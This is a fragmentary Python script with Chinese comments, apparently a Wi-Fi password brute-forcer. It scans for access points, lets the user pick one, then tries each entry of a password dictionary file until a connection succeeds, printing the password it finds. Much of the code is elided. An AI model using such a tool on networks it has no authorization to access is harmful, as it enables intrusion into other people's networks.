...
def load_dict(password_dict_path):
    ...
    if path.exists(password_dict_path):
        # 导入密码字典
...
if __name__ == '__main__':
    ...
    for index, info in available.items():
        print(
            f"AP编号{index} 秘钥管理类型{info['akm']} 名称：{info['ssid']} MAC地址：{info['bssid']} 密码加密类型：{info['cipher']} 认证算法的类型：{info['auth']}")
    # 选择要连接的AP
    while True:
        try:
    ...
    match available[ap_choose]['akm']:
        case [4]:  # 需要密码
            ...
            for passwd in load_dict("password.dic"):
                new_profiles.key = passwd
                if len(new_profiles.key) < 8:
                    ...
                    if wireless_interface[choose - 1].status() == const.IFACE_CONNECTED:  # 判断是否连接成功
                        print(
                            f'\033[32m{wireless_interface[choose - 1].name()}网卡已连接到WiFi:{available[ap_choose]["ssid"]} 密码为:{passwd}\033[0m')
                        break
                    else:
                        print(
                            f'\033[31m{wireless_interface[choose - 1].name()}网卡连接WiFi{available[ap_choose]["ssid"]}失败 密码为:{passwd}\033[0m')
        case [0]:  # 无密码则直接连接AP
            # 删除AP配置文件
            wireless_interface[choose - 1].remove_all_network_profiles()
            # 添加AP配置文件
